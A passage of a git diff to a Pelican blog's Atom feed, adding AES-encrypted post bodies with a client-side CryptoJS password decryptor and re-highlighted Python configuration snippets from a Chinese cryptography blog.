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;^&lt;/div&gt;
+&lt;p&gt;密码学从根本上讲，或许就是一种通过数学方法来解决信任问题的学问。密码学想要将对某个人或组织的信任，等价为对某种数学问题的难解性的信任。如果你相信数学，那么你也应当相信大家可以共同完成某个任务。&lt;/p&gt;</content><category term="web"></category><category term="crypto"></category><category term="cloud"></category></entry><entry><title>[Encrypted] 考博之后的思考</title><link href="http://shangfute.github.com/after-submission.html" rel="alternate"></link><published>2016-05-12T15:37:57+08:00</published><updated>2016-05-12T15:37:57+08:00</updated><author><name>尚福特</name></author><id>tag:shangfute.github.com,2016-05-12:/after-submission.html</id><summary type="html"></summary><content type="html">&lt;div id="pec-encrypted-content" style="display:none"&gt;63rexR+Foqq0UyrNfYRmmw==;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;^&lt;/div&gt;
+&lt;div id="pec-decrypted-content"&gt;
+    &lt;h4&gt;&lt;i&gt;&lt;/i&gt;&lt;/h4&gt;
+&lt;/div&gt;
+
+&lt;form id="pec-decrypt-form"&gt;
+    &lt;label for="pec-content-password"&gt;Password&lt;/label&gt;
+    &lt;input type="password" id="pec-content-password" placeholder="Password" /&gt;
+    &lt;button type="button" id="pec-decrypt-content"&gt;Decrypt&lt;/button&gt;
+&lt;/form&gt;
+
+
+    &lt;script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/components/core.js"&gt;&lt;/script&gt;
+
+    &lt;script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/components/enc-base64.js"&gt;&lt;/script&gt;
+
+    &lt;script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/components/cipher-core.js"&gt;&lt;/script&gt;
+
+    &lt;script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/components/pad-nopadding.js"&gt;&lt;/script&gt;
+
+    &lt;script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/components/md5.js"&gt;&lt;/script&gt;
+
+    &lt;script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/components/aes.js"&gt;&lt;/script&gt;
+
+
+&lt;script type="text/javascript"&gt;
+    (function () {
+        var strip_padding = function (padded_content, padding_char) {
+            /*
+             * Strips the padding character from decrypted content.
+             */
+            for (var i = padded_content.length; i &gt; 0; i--) {
+                if (padded_content[i-1] !== padding_char) {
+                    return padded_content.slice(0, i);
+                }
+            }
+        };
+
+        var decrypt_content = function (password, iv_b64, ciphertext_b64, padding_char) {
+            /*
+             * Decrypts the content from the ciphertext bundle.
+             */
+            var key = CryptoJS.MD5(password),
+                iv = CryptoJS.enc.Base64.parse(iv_b64),
+                ciphertext = CryptoJS.enc.Base64.parse(ciphertext_b64),
+                bundle = {
+                    key: key,
+                    iv: iv,
+                    ciphertext: ciphertext
+                };
+
+            var plaintext = CryptoJS.AES.decrypt(bundle, key, {iv: iv, padding: CryptoJS.pad.NoPadding});
+
+            try {
+                return strip_padding(plaintext.toString(CryptoJS.enc.Utf8), padding_char);
+            }
+            catch (err) {
+                // encoding failed; wrong password
+                return false;
+            }
+        };
+
+        var init_decryptor = function() {
+            var decrypt_btn = document.getElementById('pec-decrypt-content'),
+                password_input = document.getElementById('pec-content-password'),
+                encrypted_content = document.getElementById('pec-encrypted-content'),
+                decrypted_content = document.getElementById('pec-decrypted-content'),
+                decrypt_form = document.getElementById('pec-decrypt-form');
+
+            decrypt_btn.addEventListener('click', function () {
+                // grab the ciphertext bundle
+                var parts = encrypted_content.innerHTML.split(';');
+
+                // decrypt it
+                var content = decrypt_content(
+                    password_input.value,
+                    parts[0],
+                    parts[1],
+                    parts[2]
+                );
+
+                if (content) {
+                    // success; display the decrypted content
+                    decrypted_content.innerHTML = content;
+                    decrypt_form.parentNode.removeChild(decrypt_form);
+                    encrypted_content.parentNode.removeChild(encrypted_content);
+
+                    // any post processing on the decrypted content should be done here
+                }
+                else {
+                    // ¯\_(ツ)_/¯
+                    password_input.value = '';
+                }
+            });
+        };
+
+        document.addEventListener('DOMContentLoaded', init_decryptor);
+    })();
+&lt;/script&gt;</content><category term="thoughts"></category></entry><entry><title>[Encrypted] Think Flow</title><link href="http://shangfute.github.com/think-flow.html" rel="alternate"></link><published>2016-05-12T15:37:57+08:00</published><updated>2016-05-12T15:37:57+08:00</updated><author><name>尚福特</name></author><id>tag:shangfute.github.com,2016-05-12:/think-flow.html</id><summary type="html"></summary><content type="html">&lt;div id="pec-encrypted-content" style="display:none"&gt;1jZLCXwM09pe3qKTVvETjA==;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;^&lt;/div&gt;
 &lt;div id="pec-decrypted-content"&gt;
     &lt;h4&gt;&lt;i&gt;&lt;/i&gt;&lt;/h4&gt;
 &lt;/div&gt;
@@ -487,16 +862,16 @@ geographically distributed cloud&lt;/p&gt;
 &lt;li&gt;公式 &lt;/li&gt;
 &lt;/ol&gt;
 &lt;p&gt;测试：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;#!/usr/bin/env python&lt;/span&gt;
-&lt;span class="c"&gt;# -*- coding: utf-8 -*- #&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;
+&lt;span class="c1"&gt;# -*- coding: utf-8 -*- #&lt;/span&gt;
 &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;__future__&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;unicode_literals&lt;/span&gt;
 &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
 &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
 &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getcwd&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
 &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pelican_plugins&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;encrypt_content&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;render_math&lt;/span&gt;
 
-&lt;span class="n"&gt;AUTHOR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;u&amp;#39;尚福特&amp;#39;&lt;/span&gt;
-&lt;span class="n"&gt;SITENAME&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;u …&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;h2&gt;记录博客搭建过程&lt;/h2&gt;
+&lt;span class="n"&gt;AUTHOR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;尚福特&amp;#39;&lt;/span&gt;
+&lt;span class="n"&gt;SITENAME&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sa"&gt;u …&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;h2&gt;记录博客搭建过程&lt;/h2&gt;
 &lt;ol&gt;
 &lt;li&gt;pelican安装&lt;/li&gt;
 &lt;li&gt;github pages&lt;/li&gt;
@@ -516,65 +891,65 @@ geographically distributed cloud&lt;/p&gt;
 &lt;li&gt;公式 &lt;/li&gt;
 &lt;/ol&gt;
 &lt;p&gt;测试：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;#!/usr/bin/env python&lt;/span&gt;
-&lt;span class="c"&gt;# -*- coding: utf-8 -*- #&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;
+&lt;span class="c1"&gt;# -*- coding: utf-8 -*- #&lt;/span&gt;
 &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;__future__&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;unicode_literals&lt;/span&gt;
 &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
 &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
 &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getcwd&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
 &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pelican_plugins&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;encrypt_content&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;render_math&lt;/span&gt;
 
-&lt;span class="n"&gt;AUTHOR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;u&amp;#39;尚福特&amp;#39;&lt;/span&gt;
-&lt;span class="n"&gt;SITENAME&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;u&amp;quot;Shangfute&amp;#39;s Blog&amp;quot;&lt;/span&gt;
-&lt;span class="n"&gt;SITESUBTITLE&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;u&amp;#39;Cryptography &amp;amp; Program Anaylsis&amp;#39;&lt;/span&gt;
-&lt;span class="n"&gt;SITEURL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;http://localhost:8000&amp;#39;&lt;/span&gt;
+&lt;span class="n"&gt;AUTHOR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;尚福特&amp;#39;&lt;/span&gt;
+&lt;span class="n"&gt;SITENAME&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Shangfute&amp;#39;s Blog&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;SITESUBTITLE&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Cryptography &amp;amp; Program Anaylsis&amp;#39;&lt;/span&gt;
+&lt;span class="n"&gt;SITEURL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://localhost:8000&amp;#39;&lt;/span&gt;
 
-&lt;span class="n"&gt;PATH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;content&amp;#39;&lt;/span&gt;
+&lt;span class="n"&gt;PATH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;content&amp;#39;&lt;/span&gt;
 
-&lt;span class="n"&gt;TIMEZONE&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;Asia/Shanghai&amp;#39;&lt;/span&gt;
+&lt;span class="n"&gt;TIMEZONE&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Asia/Shanghai&amp;#39;&lt;/span&gt;
 
-&lt;span class="n"&gt;DEFAULT_LANG&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;u&amp;#39;zh-cmn-Hans&amp;#39;&lt;/span&gt;
+&lt;span class="n"&gt;DEFAULT_LANG&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;zh-cmn-Hans&amp;#39;&lt;/span&gt;
 
-&lt;span class="c"&gt;# Feed generation is usually not desired when developing&lt;/span&gt;
-&lt;span class="n"&gt;FEED_ALL_RSS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;feeds/all.rss.xml&amp;#39;&lt;/span&gt;
-&lt;span class="n"&gt;CATEGORY_FEED_RSS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;feeds/&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;.rss.xml&amp;#39;&lt;/span&gt;
+&lt;span class="c1"&gt;# Feed generation is usually not desired when developing&lt;/span&gt;
+&lt;span class="n"&gt;FEED_ALL_RSS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;feeds/all.rss.xml&amp;#39;&lt;/span&gt;
